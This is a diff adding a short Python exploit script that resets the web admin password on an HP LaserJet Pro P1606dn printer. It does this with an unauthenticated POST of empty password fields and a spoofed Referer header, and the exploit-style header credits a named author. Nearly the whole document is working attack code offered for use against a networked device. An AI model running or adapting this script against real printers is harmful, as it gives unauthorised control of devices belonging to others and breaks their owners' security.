@@ -1,0 +1,20 @@
+#!/usr/bin/python
+# Exploit Title: HP LaserJet Pro P1606dn Webadmin password reset
+# Date: 20.05.2013
+# Exploit Author: m3tamantra (http://m3tamantra.wordpress.com/blog)
+# Vendor Homepage: http://www8.hp.com/de/de/products/printers/product-detail.html?oid=4110411 
+# Firmware Date: 20100223
+
+import urllib2
+
+ip = '192.168.1.2' # Printer IP
+
+req = urllib2.Request('http://'+ip+'/cgi-bin/ip_password_result.htm', data='ID_p+184=&ID_p+184=&Apply=%C3%9Cbernehmen')
+req.add_header('Referer', 'http://'+ip+'/SSI/Auth/ip_password.htm')
+req.add_header('User-Agent', 'Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0 Iceweasel/18.0.1')
+
+f = urllib2.urlopen(req)
+if f.getcode() == 200:
+    print 'Password reset successfully\nHave a nice day ;-)'
+else:
+    print 'Exploit fail :'+f.getcode()
